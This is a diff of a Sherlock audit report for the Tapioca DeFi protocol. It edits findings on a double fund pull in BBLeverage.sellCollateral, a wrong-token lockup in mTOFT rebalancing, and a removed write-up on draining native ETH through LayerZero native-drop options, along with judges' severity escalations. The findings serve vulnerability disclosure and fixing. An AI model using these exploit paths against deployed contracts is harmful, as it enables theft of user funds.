+In `BBLeverage.sellCollateral`, the `from` variable (user)  is used as the repayer address.
+```solidity=
+if (memoryData.shareOwed <= memoryData.shareOut) {
+    _repay(from, from, memoryData.partOwed);
+} else {
+    //repay as much as we can
+    uint256 partOut = totalBorrow.toBase(amountOut, false);
+    _repay(from, from, partOut);
+}
+```
+Therefore, asset shares of user will be pulled in `BBLendingCommon._repay` function.
+```solidity=
+function _repay(address from, address to, uint256 part) internal returns (uint256 amount) {
+    ...
+    // @dev amount includes the opening & accrued fees
+    yieldBox.withdraw(assetId, from, address(this), amount, 0);
+    ...
+```
+This is incorrect behavior since the necessary asset shares were already collected by the contract in the `BBLeverage.sellCollateral` function. The repayer address should be `address(this)` for `_repay`.
+
+## Impact
+Mistakenly pulling user funds while the received asset shares remain stuck in the contract will result in losses for users who have sufficient allowance and balance when using the `BBLeverage.sellCollateral` functionality.
+## Code Snippet
+https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/bigBang/BBLeverage.sol#L156
+https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/bigBang/BBLeverage.sol#L160
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+Should fix as following:
+```solidity=
+if (memoryData.shareOwed <= memoryData.shareOut) {
+    _repay(address(this), from, memoryData.partOwed);
+} else {
+    //repay as much as we can
+    uint256 partOut = totalBorrow.toBase(amountOut, false);
+    _repay(address(this), from, partOut);
+}
+```
+
+
+
+
+## Discussion
+
+**cryptotechmaker**
+
+Duplicate of https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/42
+
+**sherlock-admin4**
+
+1 comment(s) were left on this issue during the judging contest.
+
+**takarez** commented:
+>  the amount seem to be different, the first one is hardcoded zero and the second one is the amount; so i believe is intended behavior
+
+
+
+**huuducsc**
+
+Escalate
+I believe this issue is not a duplicate of #100 since they are very different in everything. This issue should be a valid high issue, and here are the reasons:
+After issue #42 and its fix, it becomes apparent that the `sellCollateral` function attempts to deposit asset tokens into the YieldBox and then utilize the received shares to repay users. However, even though the contract receives asset shares, this function still employs the `from` to pull asset shares when calling `_repay`. This behavior results in the extraction of additional funds from users, causing unexpected losses, while the unused funds (received asset shares from depositing into the YieldBox) become stuck within this contract.
+You can review the commit fix of #42: https://github.com/Tapioca-DAO/Tapioca-bar/pull/352.
+This issue pertains to a different problem involving the incorrect calling of `_repay`. You should refer to my recommendation to understand.
+
+**sherlock-admin2**
+
+> Escalate
+> I believe this issue is not a duplicate of #100 since they are very different in everything. This issue should be a valid high issue, and here are the reasons:
+> After issue #42 and its fix, it becomes apparent that the `sellCollateral` function attempts to deposit asset tokens into the YieldBox and then utilize the received shares to repay users. However, even though the contract receives asset shares, this function still employs the `from` to pull asset shares when calling `_repay`. This behavior results in the extraction of additional funds from users, causing unexpected losses, while the unused funds (received asset shares from depositing into the YieldBox) become stuck within this contract.
+> You can review the commit fix of #42: https://github.com/Tapioca-DAO/Tapioca-bar/pull/352.
+> This issue pertains to a different problem involving the incorrect calling of `_repay`. You should refer to my recommendation to understand.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**nevillehuang**
+
+I believe this issue is correctly duplicated, in fact #100 is a more comprehensive report compared to this issue.
+
+**huuducsc**
+
+@nevillehuang I believe the 3 problems mentioned in #100 are not related to this issue. #100 represents incorrect uses of `getCollateral()`, `safeApprove()`, and `depositAsset()` functions in `buyCollateral()` function, which render the `buyCollateral()` function unable to work. It only has a medium impact. However, this issue represents the incorrect call of `_repay()` function in the `sellCollateral()` function when it attempts to pull funds from the user again. This is a different problem in a different function, and it has a high severity since users will be at risk of losing funds whenever they use `sellCollateral()` function. 
+Could you please recheck it.
+
+**cvetanovv**
+
+I agree with the escalation not being a duplicate of #100, but disagree that it should be High severity. The loss of funds is limited to the allowance and balance the user has. That's why I think it should stay Medium.
+
+**nevillehuang**
+
+@cvetanovv @cryptotechmaker @huuducsc This seems like a duplicate of #141, might want to double check if a separate fix is required. Maybe a PoC can easily confirm this? I think #101 is a variation of this issue too and could also be duplicated
+
+Might also want to consider this comments [here](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/101#issuecomment-2000942927) by @maarcweiss on duplication status
+
+**cvetanovv**
+
+I decided to accept escalation to be a valid High but will duplicate it with #141. 
+The function is the same and the impact is the same. In this issue, the function pulls double funds, in the other double allowances. However, we need to check if the fix will fix both problems.
+
+**huuducsc**
+
+@cvetanovv I don't think this issue is similar to #141 since #141 only represents the way allowance of the user for sender is spent twice. There is no higher impact in that report, and the actual root cause is different from this issue. This issue describes that `_repay` will pull funds from the user again because of an incorrect `from` address, and it doesn't mention allowance spending. The impact is different because issue #141 doesn't result in a direct loss of funds for the user; it only requires more allowance for the `sellCollateral` function. Could you please recheck?
+
+
+**nevillehuang**
+
+@huuducsc @hyh Can you guys provide a PoC to prove #141 and #59 are not duplicates? They are way too similar for me to verify, and I just want to double confirm one issue doesn't lead to another.
+
+CC @maarcweiss @cryptotechmaker @0xRektora 
+
+**cvetanovv**
+
+My final decision is to accept the escalation and this issue will not have a duplicate and will remain unique, but will also remain Medium because of the new approval system.
+
+**huuducsc**
+
+@cvetanovv The new permit system is an additional functionality, it shouldn't be a reason to consider the likelihood of this issue as low. There are no restrictions regarding approval from users to the market before utilization, so it's expected from users. Therefore, I believe the likelihood should still be high, and this issue deserves a high severity
+
+**sherlock-admin4**
+
+The protocol team fixed this issue in the following PRs/commits:
+https://github.com/Tapioca-DAO/Tapioca-bar/pull/386
+
+
+**cvetanovv**
+
+My final decision is to accept the escalation this issue to be unique but remain Medium.
+
+**nevillehuang**
+
+@huuducsc Just to check is issue #101 a duplicate of your issue? I don't want to misduplicate issues here
+
+**Evert0x**
+
+Result:
+Medium
+Unique 
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [huuducsc](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/59/#issuecomment-2032007570): accepted
 
 # Issue M-9: `leverageAmount` is incorrect in  `SGLLeverage.sellCollateral` function due to calculation based on the new states of YieldBox after withdrawal 
 
@@ -3195,266 +4284,302 @@ Please lmk if otherwise
 
 Hi @cryptotechmaker consulted tapioca's internal judge @cvetanovv and agree although fixes are similar, different funcitonalities are impacted and so it can be seen as two separate fixes combined into one, so will be separating this from #69 
 
-# Issue M-14: All ETH can be stolen during rebalancing for `mTOFTs` that hold native 
+**cryptotechmaker**
 
-Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/69 
+@nevillehuang Sure! However, there's not going to be any PR for the issue as we plan to use StargateComposer
+
+# Issue M-14: `mTOFT` can be forced to receive the wrong ERC20 leading to token lockup 
+
+Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/70 
 
 ## Found by 
-0xadrii, GiuseppeDeLaZara
+GiuseppeDeLaZara
 ## Summary
-Rebalancing of ETH transfers the ETH to the destination mTOFT without calling `sgRecieve` which leaves the ETH hanging inside the `mTOFT` contract. 
-This can be exploited to steal all the ETH.
+Due to Stargate's functionality of swapping one token on the source chain to another token on the destination chain, it is possible to force `mTOFT` to receive the wrong ERC20 token leading to token lockup.
 
 ## Vulnerability Detail
-Rebalancing of `mTOFTs` that hold native tokens is done through the `routerETH` contract inside the `Balancer.sol` contract. 
-Here is the code snippet for the `routerETH` contract:
+Stargate allows for swapping between different tokens. These are usually correlated stablecoins. They are defined as **Stargate Chains Paths** inside the docs: https://stargateprotocol.gitbook.io/stargate/developers/stargate-chain-paths.
+
+To give an example, a user can:
+
+- Provide USDC on Ethereum and receive USDT on Avalanche. 
+- Provide USDC on Avalanche and receive USDT on Arbitrum. 
+- etc.
+
+This can also be observed by just playing around with the Stargate UI: https://stargate.finance/transfer.
+
+The `Balancer.sol` contract initializes the connected OFTs through the [`initConnectedOFT`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L224) function.
+This function is only callable by the admin and he specifies the src and dst pool ids. PoolIds refer to a specific StargatePool that holds the underlying asset(USDC, USDT, etc.): https://stargateprotocol.gitbook.io/stargate/developers/pool-ids.
+
+The issue here is that poolIds are not enforced during the rebalancing process. As it can be observed the `bytes memory _ercData` is not checked for its content.
 
 ```solidity
 ## Balancer.sol
 
-if (address(this).balance < _amount) revert ExceedsBalance();
-        uint256 valueAmount = msg.value + _amount;
-        routerETH.swapETH{value: valueAmount}(
-            _dstChainId,
-            payable(this),
-            abi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft),
-            _amount,
-            _computeMinAmount(_amount, _slippage)
-        );
-```
-
-The expected behaviour is ETH being received on the destination chain whereby `sgReceive` is called and ETH is deposited inside the `TOFTVault`.
-
-```solidity
-## mTOFT.sol
-
-    function sgReceive(uint16, bytes memory, uint256, address, uint256 amountLD, bytes memory) external payable {
-        if (msg.sender != _stargateRouter) revert mTOFT_NotAuthorized();
-
-        if (erc20 == address(0)) {
-            vault.depositNative{value: amountLD}();
-        } else {
-            IERC20(erc20).safeTransfer(address(vault), amountLD);
+function _sendToken(
+        address payable _oft,
+        uint256 _amount,
+        uint16 _dstChainId,
+        uint256 _slippage,
+>>>        bytes memory _data
+    ) private {
+        address erc20 = ITOFT(_oft).erc20();
+        if (IERC20Metadata(erc20).balanceOf(address(this)) < _amount) {
+            revert ExceedsBalance();
+        }
+        {
+>>>            (uint256 _srcPoolId, uint256 _dstPoolId) = abi.decode(_data, (uint256, uint256));
+            _routerSwap(_dstChainId, _srcPoolId, _dstPoolId, _amount, _slippage, _oft, erc20);
         }
     }
+
 ```
 
-By taking a closer look at the logic inside the [`routerETH`](https://www.codeslaw.app/contracts/ethereum/0x150f94B44927F078737562f0fcF3C95c01Cc2376) contract we can see that the transfer is called with an empty payload:
-```solidity
-    // compose stargate to swap ETH on the source to ETH on the destination
-    function swapETH(
-        uint16 _dstChainId,                         // destination Stargate chainId
-        address payable _refundAddress,             // refund additional messageFee to this address
-        bytes calldata _toAddress,                  // the receiver of the destination ETH
-        uint256 _amountLD,                          // the amount, in Local Decimals, to be swapped
-        uint256 _minAmountLD                        // the minimum amount accepted out on destination
-    ) external payable {
-        require(msg.value > _amountLD, "Stargate: msg.value must be > _amountLD");
+It is simply decoded and passed as is. 
 
-        // wrap the ETH into WETH
-        IStargateEthVault(stargateEthVault).deposit{value: _amountLD}();
-        IStargateEthVault(stargateEthVault).approve(address(stargateRouter), _amountLD);
+This is a problem and imagine the following scenario:
 
-        // messageFee is the remainder of the msg.value after wrap
-        uint256 messageFee = msg.value - _amountLD;
+1. A Gelato bot calls the rebalance method for `mTOFT` that has USDC as erc20 on Ethereum.
+2. The bot encodes the `ercData` so `srcChainId = 1` pointing to USDC but `dstChainId = 2` pointing to USDT on Avalanche.
+3. Destination `mTOFT` is fetched from [`connectedOFTs`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L307) and points to the mTOFT with USDC as erc20 on Avalanche.
+4. Stargate will take USDC on Ethereum and provide USDT on Avalanche.
+5. mTOFT with USDC as underlying erc20 on Avalanche will receive USDT token and it will remain lost as the balance of the `mTOFT` contract. 
 
-        // compose a stargate swap() using the WETH that was just wrapped
-        stargateRouter.swap{value: messageFee}(
-            _dstChainId,                        // destination Stargate chainId
-            poolId,                             // WETH Stargate poolId on source
-            poolId,                             // WETH Stargate poolId on destination
-            _refundAddress,                     // message refund address if overpaid
-            _amountLD,                          // the amount in Local Decimals to swap()
-            _minAmountLD,                       // the minimum amount swap()er would allow to get out (ie: slippage)
-            IStargateRouter.lzTxObj(0, 0, "0x"),
-            _toAddress,                         // address on destination to send to
->>>>>>      bytes("")                           // empty payload, since sending to EOA
-        );
-    }
-```
-
-Notice the comment:
-
-> empty payload, since sending to EOA
-
-So `routerETH` after depositing ETH in `StargateEthVault` calls the regular `StargateRouter` but with an empty payload. 
-
-Next, let's see how the receiving logic works.
-
-As Stargate is just another application built on top of LayerZero the receiving starts inside the [`Bridge::lzReceive`](https://github.com/stargate-protocol/stargate/blob/5f0dfd290d8290678b933b64f31d119b3c4b4e6a/contracts/Bridge.sol#L58) function.
-As the type of transfer is `TYPE_SWAP_REMOTE` the `router::swapRemote` is called:
-
-```solidity
-function lzReceive(
-    uint16 _srcChainId,
-    bytes memory _srcAddress,
-    uint64 _nonce,
-    bytes memory _payload
-) external override {
-
-
-    if (functionType == TYPE_SWAP_REMOTE) {
-        (
-            ,
-            uint256 srcPoolId,
-            uint256 dstPoolId,
-            uint256 dstGasForCall,
-            Pool.CreditObj memory c,
-            Pool.SwapObj memory s,
-            bytes memory to,
-            bytes memory payload
-        ) = abi.decode(_payload, (uint8, uint256, uint256, uint256, Pool.CreditObj, Pool.SwapObj, bytes, bytes));
-        address toAddress;
-        assembly {
-            toAddress := mload(add(to, 20))
-        }
-        router.creditChainPath(_srcChainId, srcPoolId, dstPoolId, c);
->>>>>>  router.swapRemote(_srcChainId, _srcAddress, _nonce, srcPoolId, dstPoolId, dstGasForCall, toAddress, s, payload);
-```
-
-[`Router:swapRemote`](https://github.com/stargate-protocol/stargate/blob/5f0dfd290d8290678b933b64f31d119b3c4b4e6a/contracts/Router.sol#L390-#L425) has two responsibilities:
-- First it calls `pool::swapRemote` that transfers the actual tokens to the destination address. In this case this is the `mTOFT` contract. 
-- Second it will call `IStargateReceiver(mTOFTAddress)::sgReceive` but only if the payload is not empty.
-
-```solidity
- function _swapRemote(
-    uint16 _srcChainId,
-    bytes memory _srcAddress,
-    uint256 _nonce,
-    uint256 _srcPoolId,
-    uint256 _dstPoolId,
-    uint256 _dstGasForCall,
-    address _to,
-    Pool.SwapObj memory _s,
-    bytes memory _payload
-) internal {
-    Pool pool = _getPool(_dstPoolId);
-    // first try catch the swap remote
-    try pool.swapRemote(_srcChainId, _srcPoolId, _to, _s) returns (uint256 amountLD) {
->>>>>>   if (_payload.length > 0) {
-            // then try catch the external contract call
->>>>>>      try IStargateReceiver(_to).sgReceive{gas: _dstGasForCall}(_srcChainId, _srcAddress, _nonce, pool.token(), amountLD, _payload) {
-                // do nothing
-            } catch (bytes memory reason) {
-                cachedSwapLookup[_srcChainId][_srcAddress][_nonce] = CachedSwap(pool.token(), amountLD, _to, _payload);
-                emit CachedSwapSaved(_srcChainId, _srcAddress, _nonce, pool.token(), amountLD, _to, _payload, reason);
-            }
-        }
-    } catch {
-        revertLookup[_srcChainId][_srcAddress][_nonce] = abi.encode(
-            TYPE_SWAP_REMOTE_RETRY,
-            _srcPoolId,
-            _dstPoolId,
-            _dstGasForCall,
-            _to,
-            _s,
-            _payload
-        );
-        emit Revert(TYPE_SWAP_REMOTE_RETRY, _srcChainId, _srcAddress, _nonce);
-    }
-}
-```
-
-As payload is empty in case of using the `routerETH` contract the `sgReceive` function is never called. This means that the ETH is left sitting inside the `mTOFT` contract. 
-
-There are several ways of stealing the balance of `mTOFT`. 
-An attacker can use the [`mTOFT::sendPacket`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/mTOFT.sol#L234) function and utilize the `lzNativeGasDrop` option to airdrop the balance of mTOFT to attacker's address on the destination chain: https://docs.layerzero.network/contracts/options#lznativedrop-option
-
-```solidity
-## TapiocaOmnichainSender.sol
-
- function sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)
-        external
-        payable
-        returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)
-    {
-        // @dev Applies the token transfers regarding this send() operation.
-        // - amountDebitedLD is the amount in local decimals that was ACTUALLY debited from the sender.
-        // - amountToCreditLD is the amount in local decimals that will be credited to the recipient on the remote OFT instance.
-        (uint256 amountDebitedLD, uint256 amountToCreditLD) =
-            _debit(_lzSendParam.sendParam.amountLD, _lzSendParam.sendParam.minAmountLD, _lzSendParam.sendParam.dstEid);
-
-        // @dev Builds the options and OFT message to quote in the endpoint.
-        (bytes memory message, bytes memory options) =
-            _buildOFTMsgAndOptions(_lzSendParam.sendParam, _lzSendParam.extraOptions, _composeMsg, amountToCreditLD);
-
-        // @dev Sends the message to the LayerZero endpoint and returns the LayerZero msg receipt.
-        msgReceipt =
-            _lzSend(_lzSendParam.sendParam.dstEid, message, options, _lzSendParam.fee, _lzSendParam.refundAddress);
-        // @dev Formulate the OFT receipt.
-        oftReceipt = OFTReceipt(amountDebitedLD, amountToCreditLD);
-
-        emit OFTSent(msgReceipt.guid, _lzSendParam.sendParam.dstEid, msg.sender, amountDebitedLD);
-    }
-```
-
-All he has to do is specify the option type `lzNativeDrop` inside the `_lsSendParams.extraOptions` and the cost of calling `_lzSend` plus the airdrop amount will be paid out from the balance of `mTOFT`.
-
-As this is a complete theft of the rebalanced amount I'm rating this as a critical vulnerability.
-
+As this is a clear path for locking up wrong tokens inside the `mTOFT` contract, it is a critical issue.
 
 ## Impact
-All ETH can be stolen during rebalancing for mTOFTs that hold native tokens.
+The impact of this vulnerability is critical. It allows for locking up wrong tokens inside the mTOFT contract causing irreversible loss of funds. 
 
 ## Code Snippet
-- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L269-#L279
-
+- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L293
 
 ## Tool used
 
 Manual Review
 
 ## Recommendation
-One way to fix this is use the alternative `RouterETH.sol` contract available from Stargate that allows for a payload to be sent. 
-It is denoted as `*RouterETH.sol` in the Stargate documentation: https://stargateprotocol.gitbook.io/stargate/developers/contract-addresses/mainnet
-This router has the `swapETHAndCall` interface:
+The `initConnectedOFT` function should enforce the poolIds for the src and dst chains.The rebalance function should just fetch these saved values and use them.
 
-```solidity
-function swapETHAndCall(
-        uint16 _dstChainId, // destination Stargate chainId
-        address payable _refundAddress, // refund additional messageFee to this address
-        bytes calldata _toAddress, // the receiver of the destination ETH
-        SwapAmount memory _swapAmount, // the amount and the minimum swap amount
-        IStargateRouter.lzTxObj memory _lzTxParams, // the LZ tx params
-        bytes calldata _payload // the payload to send to the destination
-    ) external payable {
+```diff
+ 
+@@ -164,14 +176,12 @@ contract Balancer is Ownable {
+      * @param _dstChainId the destination LayerZero id
+      * @param _slippage the destination LayerZero id
+      * @param _amount the rebalanced amount
+-     * @param _ercData custom send data
+      */
+     function rebalance(
+         address payable _srcOft,
+         uint16 _dstChainId,
+         uint256 _slippage,
+-        uint256 _amount,
+-        bytes memory _ercData
++        uint256 _amount
+     ) external payable onlyValidDestination(_srcOft, _dstChainId) onlyValidSlippage(_slippage) {
+         {
+@@ -188,13 +204,13 @@ contract Balancer is Ownable {
+             if (msg.value == 0) revert FeeAmountNotSet();
+             if (_isNative) {
+                 if (disableEth) revert SwapNotEnabled();
+                 _sendNative(_srcOft, _amount, _dstChainId, _slippage);
+             } else {
+-                _sendToken(_srcOft, _amount, _dstChainId, _slippage, _ercData);
++                _sendToken(_srcOft, _amount, _dstChainId, _slippage);
+             }
+
+ 
+@@ -221,7 +237,7 @@ contract Balancer is Ownable {
+      * @param _dstOft the destination TOFT address
+      * @param _ercData custom send data
+      */
+-    function initConnectedOFT(address _srcOft, uint16 _dstChainId, address _dstOft, bytes memory _ercData)
++    function initConnectedOFT(address _srcOft, uint256 poolId, uint16 _dstChainId, address _dstOft, bytes memory _ercData)
+         external
+         onlyOwner
+     {
+@@ -231,10 +247,8 @@ contract Balancer is Ownable {
+         bool isNative = ITOFT(_srcOft).erc20() == address(0);
+         if (!isNative && _ercData.length == 0) revert PoolInfoRequired();
+ 
+-        (uint256 _srcPoolId, uint256 _dstPoolId) = abi.decode(_ercData, (uint256, uint256));
+-
+         OFTData memory oftData =
+-            OFTData({srcPoolId: _srcPoolId, dstPoolId: _dstPoolId, dstOft: _dstOft, rebalanceable: 0});
++            OFTData({srcPoolId: poolId, dstPoolId: poolId, dstOft: _dstOft, rebalanceable: 0});
+ 
+         connectedOFTs[_srcOft][_dstChainId] = oftData;
+         emit ConnectedChainUpdated(_srcOft, _dstChainId, _dstOft);
+ 
+     function _sendToken(
+         address payable _oft,
+         uint256 _amount,
+         uint16 _dstChainId,
+-        uint256 _slippage,
+-        bytes memory _data
++        uint256 _slippage
+     ) private {
+         address erc20 = ITOFT(_oft).erc20();
+         if (IERC20Metadata(erc20).balanceOf(address(this)) < _amount) {
+             revert ExceedsBalance();
+-        }
++            }
+         {
+-            (uint256 _srcPoolId, uint256 _dstPoolId) = abi.decode(_data, (uint256, uint256));
+-            _routerSwap(_dstChainId, _srcPoolId, _dstPoolId, _amount, _slippage, _oft, erc20);
++            _routerSwap(_dstChainId, _amount, _slippage, _oft, erc20);
+         }
+     }
+ 
+     function _routerSwap(
+         uint16 _dstChainId,
+-        uint256 _srcPoolId,
+-        uint256 _dstPoolId,
+         uint256 _amount,
+         uint256 _slippage,
+         address payable _oft,
+         address _erc20
+     ) private {
+         bytes memory _dst = abi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft);
++        uint256 poolId = connectedOFTs[_oft][_dstChainId].srcPoolId;
+         IERC20(_erc20).safeApprove(address(router), _amount);
+         router.swap{value: msg.value}(
+             _dstChainId,
+-            _srcPoolId,
+-            _dstPoolId,
++            poolId,
++            poolId,
+             payable(this),
+             _amount,
+             _computeMinAmount(_amount, _slippage),
 ```
 
-The contract on Ethereum can be found at: https://www.codeslaw.app/contracts/ethereum/0xb1b2eeF380f21747944f46d28f683cD1FBB4d03c. 
-And the Stargate docs specify its deployment address on all the chains where ETH is supported: https://stargateprotocol.gitbook.io/stargate/developers/contract-addresses/mainnet
+Admin is trusted but you can optionally add additional checks inside the `initConnectedOFT` function to ensure that the poolIds are correct for the src and dst mTOFTs. 
 
 
 
 ## Discussion
 
-**cryptotechmaker**
+**sherlock-admin4**
 
-We had a chat with LZ about this a while ago and yes, the router cannot be used in this case. However the contract we're going to use is https://etherscan.io/address/0xeCc19E177d24551aA7ed6Bc6FE566eCa726CC8a9#code and it respects the IStargateRouter interface
+The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/175.
+
+**dmitriia**
+
+Escalate
+While the impact is clearly high/critical, the probability of this looks to be low/very low as rebalance() is [permissioned](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L176), so what is described here is a keeper/configuration mistake and there looks to be no way for this to be exploited by an outside attacker. Why user mistakes with the very same full fund loss impact (e.g. #112, #132) are discarded, while keeper mistake isn't?
+Notice that per [contest terms](https://audits.sherlock.xyz/contests/170) all protocol actors are trusted:
+```md
+Are the admins of the protocols your contracts integrate with (if any) TRUSTED or RESTRICTED?
+
+TRUSTED
+
+Is the admin/owner of the protocol/contracts TRUSTED or RESTRICTED?
+
+TRUSTED
+```
+In the same time, as this is more deep in nature compared to common mistakes, I would say medium severity can be applicable.
+
+**sherlock-admin2**
+
+> Escalate
+> While the impact is clearly high/critical, the probability of this looks to be low/very low as rebalance() is [permissioned](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L176), so what is described here is a keeper/configuration mistake and there looks to be no way for this to be exploited by an outside attacker. Why user mistakes with the very same full fund loss impact (e.g. #112, #132) are discarded, while keeper mistake isn't?
+> Notice that per [contest terms](https://audits.sherlock.xyz/contests/170) all protocol actors are trusted:
+> ```md
+> Are the admins of the protocols your contracts integrate with (if any) TRUSTED or RESTRICTED?
+> 
+> TRUSTED
+> 
+> Is the admin/owner of the protocol/contracts TRUSTED or RESTRICTED?
+> 
+> TRUSTED
+> ```
+> In the same time, as this is more deep in nature compared to common mistakes, I would say medium severity can be applicable.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
 
 **windhustler**
 
-The contract you referenced above, i.e. [`StargateComposer`](https://etherscan.io/address/0xeCc19E177d24551aA7ed6Bc6FE566eCa726CC8a9#code) doesn't have the `swapETH` interface: 
+The escalation comment is comparing apples to oranges. User mistakes are completely different than the critical severity attack path described here.
 
-```solidity
-function swapETH(uint16 _dstChainId, address payable _refundAddress, bytes calldata _toAddress, uint256 _amountLD, uint256 _minAmountLD) external;
-```
+`rebalance` function was meant to be called by an automation system to offload manually calling the function. The function definitely shouldn’t exclude basic input parameters validation which the report above highlights. 
 
-Your options are to refactor this to either use the [`*RouterETH: swapETHAndCall`](https://etherscan.io/address/0xb1b2eeF380f21747944f46d28f683cD1FBB4d03c#code) or the [`StargateComposer::swapETHAndCall`](https://etherscan.io/address/0xeCc19E177d24551aA7ed6Bc6FE566eCa726CC8a9#code) function.
+Since when are off-chain agents responsible for validating inputs and the smart contract security being offloaded to the off-chain server?
+
+Moreover, most automation systems are either partly or on the road to being decentralized where anyone can become an operator. So there is a clear path for a malicious actor to exploit this. 
+
+The issue is not some obscure, low-likelihood attack path but rather a straightforward way of irreversibly losing all the rebalanced amount.
+
+If we look at: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/87 ,a hypothetical token with different decimals across chains was accepted as “medium likelihood”, although such a token isn't accepted as collateral right and there is only a small probability a token with such properties will be added in the future.
+
+**dmitriia**
+
+The lack of any configuration check in a permissioned function usually do not account for anything above medium as the only way for it to cause any damage is operator's mistake.
+
+#87 is about user-facing flow.
+
+**windhustler**
+
+It's a bit more nuanced than that. Based on the number of issues in the `Balancer` contract it seems that the team has overlooked several scenarios. 
+When it comes to off-chain agents, most of them are either fully or on their way to becoming decentralized:
+
+- https://keep3r.network/ Anyone can become a keeper. 
+- https://forum.gelato.network/discussion/11360-node-operator-staking-wave-1 Gelato network plans are to also become fully decentralized with time. 
+
+So, this issue also highlights the importance of validating inputs with functions meant to be called by these agents. 
+
+But, as always I leave it to the judge to decide on the severity. 
+
+https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/87 is about Governance setting tokens with different decimals across chains as collateral in the future versions of Tapioca. As these tokens are very uncommon and even less likely to be used as collateral the likelihood of this occurring is very low. The report also doesn't mention a concrete token, so we can assume it's a hypothetical one. 
 
 
-**cryptotechmaker**
+**dmitriia**
 
-Good catch @windhustler
+Anyone cannot run `rebalance()`, its use is fixed to `rebalancer` actor, one address. Permissionless rebalancing setups tend to constitute high severity surfaces on their own. Any decentralized mechanics, i.e. when actors can be random, but, for example, have something at stake, need to be examined for incentives. Say when NPV of the attack payout is greater than actor's stake in a keeper system, then it's a rough equivalent of permissionless setup with lower attack payoff, and might be exploited.
+
+#87 is about a miss in the logic (not converting the input), this is about not checking the configuration of the permissioned call.
+
+**windhustler**
+
+You have proof I pasted above of how the automation system is decentralized or getting decentralized. The contest README also states: "External issues/integrations that would affect Tapioca, should be considered."
+
+https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/87 And an exploit that occurs with a token that doesn't exist yet. 
 
 
-**cryptotechmaker**
 
-Changed the status to 'Will fix'
+**cvetanovv**
 
+I think escalation is correct because `rebalance()` is restricted and trusted. The only reason I see a chance for it to remain a valid issue is that in the Readme we have "External issues/integrations that would affect Tapioca, should be considered." 
 
-**sherlock-admin4**
+But that's exactly why it falls into the Medium category. The function is not for everyone and there are too many conditions. Let's look at the Sherlock [documentation](https://docs.sherlock.xyz/audits/judging/judging#v.-how-to-identify-a-medium-issue) for Medium severity: "Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained."
 
-The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/174; https://github.com/Tapioca-DAO/tapioca-periph/pull/198.
+So I think it's fair to accept the escalation and downgrade to Medium.
+
+**cvetanovv**
+
+Planning to accept the escalation and make this issue a Medium.
+
+**windhustler**
+
+@cvetanovv Thanks for taking a look. I'd still appreciate it if @Czar102 could take a look at this one. I acknowledge the permissioned nature of the `rebalance` function, but as I've highlighted this can be ambiguous under certain conditions and it's handing over the security to an automation system. Also, consider my points that other issues with very low likelihood https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/87 were judged as high severity. 
+
+Thanks!  
+
+**Evert0x**
+
+Result:
+Medium
+Unique
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [dmitriia](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/70/#issuecomment-2034526249): accepted
 
 # Issue M-15: Stargate Pools conversion rate leads to token accumulation inside the Balancer contract 
 
@@ -3576,12 +4701,322 @@ Did a fix here https://github.com/Tapioca-DAO/TapiocaZ/pull/176; https://github.
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/176; https://github.com/Tapioca-DAO/tapioca-periph/pull/199.
 
-# Issue M-16: Leverage borrowing with stale rate can atomically create bad debt with no prior positions and no investment 
+# Issue M-16: Gas parameters for Stargate swap are hardcoded leading to stuck messages 
+
+Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/72 
+
+## Found by 
+GiuseppeDeLaZara
+## Summary
+The `dstGasForCall` for transferring erc20s through Stargate is hardcoded to 0 in the `Balancer` contract leading to `sgReceive` not being called during Stargate swap.
+As a consequence, the `sgReceive` has to be manually called to clear the `cachedSwapLookup` mapping, but this can be DoSed due to the fact that the `mTOFT::sgReceive` doesn't validate any of its parameters.
+This can be exploited to perform a long-term DoS attack. 
+
+## Vulnerability Detail
+### Gas parameters for Stargate
+
+Stargate Swap allows the caller to specify the:
+
